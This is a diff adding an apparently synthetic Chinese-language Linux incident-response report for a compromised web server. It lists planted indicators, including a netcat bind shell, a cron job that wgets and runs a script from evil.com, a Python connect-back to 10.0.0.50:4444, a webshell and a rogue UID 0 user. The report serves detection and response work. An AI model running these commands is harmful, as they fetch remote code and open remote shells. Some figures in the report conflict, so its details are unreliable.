@@ -1,0 +1,230 @@
+Linux 应急响应报告 (增强版)
+生成时间: 2025-06-06 11:17:00
+主机名: web-server-01
+操作系统: ubuntu
+##########################################
+
+##########################################
+模块: 系统后门排查
+==========================================
+------------------------------------------
+子项: UID为0的非root用户
+------------------------------------------
+可疑UID 0用户: hacker
+------------------------------------------
+子项: 可疑系统配置
+------------------------------------------
+检查系统配置文件权限:
+-rw-r--r-- 1 root root 1234 Jun  6 10:00 /etc/passwd
+-rw-r----- 1 root shadow 567 Jun  6 10:00 /etc/shadow
+-rw-r--r-- 1 root root 890 Jun  6 10:00 /etc/group
+-r--r----- 1 root root 456 Jun  6 10:00 /etc/sudoers
+检查异常的系统配置:
+-rw-r--r-- 1 root root 123 Jun  6 09:30 /etc/malware.conf
+------------------------------------------
+子项: 异常系统文件
+------------------------------------------
+检查关键目录下的异常文件:
+-rwxr-xr-x 1 root root 8192 Jun  6 09:45 /usr/bin/backdoor
+检查异常的系统库文件:
+-rwxr-xr-x 1 root root 4096 Jun  6 09:50 /usr/lib/evil.so
+
+##########################################
+模块: 用户与登录检查
+==========================================
+------------------------------------------
+子项: 当前用户
+------------------------------------------
+root
+------------------------------------------
+子项: 所有用户
+------------------------------------------
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+systemd-network
+systemd-resolve
+syslog
+messagebus
+_apt
+uuidd
+avahi-autoipd
+usbmux
+dnsmasq
+rtkit
+cups-pk-helper
+geoclue
+pulse
+gnome-initial-setup
+gdm
+hacker
+admin
+------------------------------------------
+子项: 最近登录记录
+------------------------------------------
+admin    pts/0        192.168.1.100    Wed Jun  5 14:30 - 16:45  (02:15)
+hacker   pts/1        10.0.0.50        Wed Jun  5 22:15 - 23:30  (01:15)
+root     console                       Wed Jun  5 08:00   still logged in
+------------------------------------------
+子项: 登录失败记录
+------------------------------------------
+Jun  6 02:15:01 web-server-01 sshd[1234]: Failed password for invalid user admin from 192.168.1.200 port 22 ssh2
+Jun  6 02:15:05 web-server-01 sshd[1235]: Failed password for invalid user admin from 192.168.1.200 port 22 ssh2
+Jun  6 02:15:10 web-server-01 sshd[1236]: Failed password for invalid user admin from 192.168.1.200 port 22 ssh2
+Jun  6 02:15:15 web-server-01 sshd[1237]: Failed password for root from 192.168.1.200 port 22 ssh2
+Jun  6 02:15:20 web-server-01 sshd[1238]: Failed password for root from 192.168.1.200 port 22 ssh2
+
+##########################################
+模块: 网络检查
+==========================================
+------------------------------------------
+子项: 监听端口
+------------------------------------------
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=1000,fd=3))
+tcp   LISTEN 0      80           0.0.0.0:80        0.0.0.0:*    users:(("apache2",pid=2000,fd=4))
+tcp   LISTEN 0      128          0.0.0.0:443       0.0.0.0:*    users:(("apache2",pid=2000,fd=6))
+tcp   LISTEN 0      128          0.0.0.0:3306      0.0.0.0:*    users:(("mysqld",pid=3000,fd=10))
+tcp   LISTEN 0      128          0.0.0.0:4444      0.0.0.0:*    users:(("nc",pid=4000,fd=3))
+tcp   LISTEN 0      128          0.0.0.0:8080      0.0.0.0:*    users:(("python",pid=5000,fd=3))
+------------------------------------------
+子项: 活动连接
+------------------------------------------
+tcp   ESTAB  0      0      192.168.1.10:22     192.168.1.100:54321  users:(("sshd",pid=1001,fd=3))
+tcp   ESTAB  0      0      192.168.1.10:4444   10.0.0.50:12345      users:(("nc",pid=4000,fd=4))
+------------------------------------------
+子项: 可疑连接
+------------------------------------------
+tcp   ESTAB  0      0      192.168.1.10:4444   10.0.0.50:12345      users:(("nc",pid=4000,fd=4))
+
+##########################################
+模块: 进程检查
+==========================================
+------------------------------------------
+子项: 高CPU占用进程
+------------------------------------------
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root      4000 95.0  0.1   4532  1024 ?        R    09:45   1:23 nc -l -p 4444 -e /bin/bash
+www-data  5000 85.2  2.1  12345  8192 ?        S    09:50   0:45 python -c "import socket..."
+root      3000 15.3  5.2  98765 20480 ?        S    08:00   2:15 /usr/sbin/mysqld
+------------------------------------------
+子项: 可疑脚本进程
+------------------------------------------
+4000 nc -l -p 4444 -e /bin/bash
+5000 python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0', 8080))"
+6000 bash /tmp/.hidden_script.sh
+7000 perl -e "fork(); exec('/bin/sh')"
+
+##########################################
+模块: 文件系统检查
+==========================================
+------------------------------------------
+子项: SUID文件
+------------------------------------------
+-rwsr-xr-x 1 root root    44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root    84016 Jul 15  2021 /bin/mount
+-rwsr-xr-x 1 root root    63960 Jul 15  2021 /bin/umount
+-rwsr-xr-x 1 root root    88464 Mar 22  2019 /bin/fusermount
+-rwsr-xr-x 1 root root   154876 Jan 31  2020 /usr/bin/sudo
+-rwsr-xr-x 1 root root    22528 Mar 27  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root    59640 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root    44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root    40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root    76496 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root     8192 Jun  6 09:45 /usr/bin/backdoor
+------------------------------------------
+子项: 最近修改的文件
+------------------------------------------
+-rw-r--r-- 1 root root 1024 Jun  6 09:30 /etc/malware.conf
+-rwxr-xr-x 1 root root 8192 Jun  6 09:45 /usr/bin/backdoor
+-rwxr-xr-x 1 root root 4096 Jun  6 09:50 /usr/lib/evil.so
+-rw-r--r-- 1 www-data www-data 2048 Jun  6 10:00 /var/www/html/webshell.php
+
+##########################################
+模块: 持久化检查
+==========================================
+------------------------------------------
+子项: 自启动服务
+------------------------------------------
+apache2.service                           enabled
+mysql.service                             enabled
+ssh.service                               enabled
+backdoor.service                          enabled
+------------------------------------------
+子项: 计划任务
+------------------------------------------
+系统计划任务:
+# /etc/crontab: system-wide crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *   * * *   root    wget -O /tmp/.update http://evil.com/backdoor.sh && bash /tmp/.update
+Cron目录内容:
+用户计划任务:
+用户: hacker
+*/10 * * * * python -c "import socket; exec(socket.socket().connect(('10.0.0.50', 4444)))"
+------------------------------------------
+子项: SSH公钥
+------------------------------------------
+用户 hacker 的SSH密钥:
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... hacker@evil.com
+用户 admin 的SSH密钥:
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD8... admin@company.com
+
+##########################################
+模块: 统计分析与建议
+==========================================
+------------------------------------------
+子项: 系统统计概览
+------------------------------------------
+=== 系统基本信息 ===
+操作系统: ubuntu
+检查时间: Wed Jun  6 11:17:00 UTC 2025
+总用户数: 25
+UID为0的非root用户: 1
+监听端口数: 6
+可疑进程数: 4
+SUID文件数: 11
+最近修改文件数: 4
+登录失败次数: 5
+计划任务数: 2
+------------------------------------------
+子项: 安全风险评估
+------------------------------------------
+整体风险等级: 高危 (评分: 95)
+------------------------------------------
+子项: 处置建议
+------------------------------------------
+[高危] 发现1个非root的UID为0用户，建议立即与运维开发人员确认这些用户的合法性。
+[低危] 发现4个可疑脚本进程，建议确认业务必要性。
+[低危] 监听端口数量(6)较多，建议关闭不必要的服务。
+------------------------------------------
+子项: 应急响应检查清单
+------------------------------------------
+□ 1. 确认所有UID为0的用户合法性
+□ 2. 检查可疑进程的业务必要性
+□ 3. 审查SUID文件是否存在异常
+□ 4. 分析登录失败日志，确认是否存在攻击
+□ 5. 检查网络服务配置，关闭不必要端口
+□ 6. 审查计划任务和启动项配置
+□ 7. 检查最近修改的系统文件
+□ 8. 确认SSH密钥配置的合法性
+□ 9. 进行完整的恶意软件扫描
+□ 10. 更新系统和安全补丁
